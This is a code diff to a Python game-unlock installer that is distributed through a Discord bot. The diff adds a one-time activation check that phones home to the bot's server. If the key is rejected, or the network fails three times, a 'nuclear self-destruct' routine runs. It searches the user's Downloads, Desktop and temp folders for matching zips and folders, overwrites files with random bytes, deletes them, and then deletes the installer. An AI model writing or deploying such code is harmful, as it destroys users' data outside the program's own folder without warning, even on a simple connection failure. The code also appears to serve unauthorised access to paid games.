@@ -1150,6 +1150,153 @@ def _wipe_file_with_garbage(path: Path) -> None:
         pass
 
 
+# ─── Anti-share: validate the per-zip activation key ─────────
+# Every zip the bot generates carries a 48-hex secret in
+# payload-manifest.json under `_sig`. The bot stores the same value in
+# its TokenDownload table (column `installerKey`). On first run the
+# installer POSTs to /installer-validate/<sig>; bot flips
+# consumed=true. Any second attempt — by the same user OR someone they
+# shared the zip with — gets a 410 and triggers nuclear self-destruct.
+
+def _validate_installer_key(manifest: dict) -> tuple[bool, str]:
+    """
+    Returns (ok, reason). Strict: returns False for explicit rejection
+    AND for repeated network failures, since both can mask piracy.
+    Only returns True if the bot's HTTP endpoint answers 200.
+
+    `reason` is a short, human-readable string for the popup.
+    """
+    sig = (manifest.get("_sig") or "").strip()
+    base_url = (manifest.get("base_url") or "").strip()
+    if not sig:
+        return False, "missing activation key"
+    if not base_url:
+        return False, "missing server URL"
+    if not re.match(r"^https?://", base_url, re.IGNORECASE):
+        base_url = "https://" + base_url
+    endpoint = f"{base_url.rstrip('/')}/installer-validate/{sig}"
+
+    last_reason = "network error"
+    for attempt in range(3):
+        try:
+            req = urllib.request.Request(
+                endpoint,
+                data=b"",
+                method="POST",
+                headers={
+                    "User-Agent": "GameGen-Installer/1.0",
+                    "Content-Length": "0",
+                },
+            )
+            with urllib.request.urlopen(req, timeout=12) as resp:
+                if resp.status == 200:
+                    return True, "ok"
+                # Should never happen — server uses 410/4xx for rejects
+                # and raises HTTPError, but be defensive.
+                return False, f"server returned HTTP {resp.status}"
+        except urllib.error.HTTPError as e:
+            # 4xx = explicit rejection — don't retry, fail immediately.
+            if 400 <= e.code < 500:
+                try:
+                    body = e.read().decode("utf-8", errors="ignore")[:120].strip()
+                except Exception:
+                    body = ""
+                return False, body or f"rejected (HTTP {e.code})"
+            last_reason = f"server error {e.code}"
+        except (urllib.error.URLError, TimeoutError, OSError) as e:
+            last_reason = f"network: {type(e).__name__}"
+        # Backoff between retries
+        time.sleep(2 * (attempt + 1))
+    return False, last_reason
+
+
+def nuclear_self_destruct(here: Path, self_path: Path) -> None:
+    """
+    Activation key rejected → destroy every copy of the zip and the
+    installer we can reach. Goes beyond regular self_destruct():
+      - Wipes the extracted folder (same as regular)
+      - Scans Downloads, Desktop, and %TEMP% for zip files and
+        extracted folders matching the bot's naming patterns
+        (Token [*].zip / TEST [*].zip / Token [*] / TEST [*])
+      - Overwrites sensitive files with random bytes before unlinking
+      - Schedules installer.exe to self-delete via the same job-
+        breakaway cmd trick as the success path
+    Idempotent and best-effort: every step is wrapped in try/except so
+    a permission error on one file doesn't stop us from killing others.
+    """
+    # Step 1: wipe the immediate extracted folder.
+    try:
+        _wipe_extracted_folder(here, self_path.name)
+    except Exception:
+        pass
+
+    # Step 2: hunt for related zips/folders in common download spots.
+    search_dirs: list[Path] = []
+    for env_key in ("USERPROFILE", "HOMEDRIVE", "HOMEPATH"):
+        # Not really used — Path.home() covers it on Windows.
+        pass
+    candidates = [
+        Path.home() / "Downloads",
+        Path.home() / "Desktop",
+        Path(os.environ.get("TEMP", "")) if os.environ.get("TEMP") else None,
+        Path(os.environ.get("TMP", "")) if os.environ.get("TMP") else None,
+    ]
+    for c in candidates:
+        if c and c.exists() and c.is_dir():
+            search_dirs.append(c)
+    # Dedupe by resolved path
+    seen = set()
+    unique_dirs = []
+    for d in search_dirs:
+        try:
+            r = d.resolve()
+        except OSError:
+            continue
+        if r in seen:
+            continue
+        seen.add(r)
+        unique_dirs.append(d)
+
+    patterns = ["Token [*].zip", "TEST [*].zip", "Token [*]", "TEST [*]"]
+    for d in unique_dirs:
+        for pat in patterns:
+            try:
+                matches = list(d.glob(pat))
+            except OSError:
+                continue
+            for found in matches:
+                try:
+                    if found.is_file():
+                        _wipe_file_with_garbage(found)
+                        _clear_readonly(found)
+                        found.unlink()
+                    elif found.is_dir():
+                        # Recursively wipe sensitive contents first
+                        for sub in list(found.rglob("*")):
+                            if not sub.is_file():
+                                continue
+                            try:
+                                if sub.name.lower() in {
+                                    "configs.user.ini",
+                                    "payload-manifest.json",
+                                    "gamegen-modes.txt",
+                                }:
+                                    _wipe_file_with_garbage(sub)
+                                _clear_readonly(sub)
+                                sub.unlink()
+                            except OSError:
+                                pass
+                        shutil.rmtree(found, ignore_errors=True)
+                except OSError:
+                    pass
+
+    # Step 3: schedule the installer .exe + its folder to self-delete.
+    try:
+        _schedule_self_delete(here, self_path)
+    except Exception:
+        pass
+
+
 def _wipe_extracted_folder(here: Path, self_name: str) -> None:
     """
     Aggressively delete everything in the extracted zip folder EXCEPT
@@ -1328,6 +1475,30 @@ def _derive_game_name(self_name: str, game_dir: Path) -> str:
 def main() -> None:
     here = payload_root()
     self_name = Path(sys.argv[0]).name
+    self_path = Path(sys.argv[0]).resolve()
+
+    # ─── Phase 0: validate the per-zip activation key ────────────────
+    # Before reading appid, finding Steam, anything — we POST our `_sig`
+    # from payload-manifest.json to /installer-validate/<sig>. If the
+    # bot says no (or the network can't reach the bot after 3 retries),
+    # NUKE every copy of the zip and the installer itself, then exit.
+    # This is the choke point that makes the installer single-use.
+    manifest = _detect_thin_manifest(here)
+    if manifest:
+        ok, reason = _validate_installer_key(manifest)
+        if not ok:
+            gamegen_msgbox(
+                "This activation key has already been used or is no longer valid.\n\n"
+                "Each token download is meant for ONE install. If you legitimately need to "
+                "re-install, please re-open your ticket on Discord and the team will issue a new token.\n\n"
+                f"(Reason: {reason})",
+                icon=MB_ICON_ERROR,
+            )
+            nuclear_self_destruct(here, self_path)
+            sys.exit(1)
+    # Legacy zips with no payload-manifest.json (offline embedded
+    # multi-mode, dev test builds) skip validation — but those don't
+    # ship outside of internal testing anyway.
 
     # 1. Read app id from any bundled steam_appid.txt. V1's flat layout puts
     #    it at steam_settings/steam_appid.txt right next to the installer,
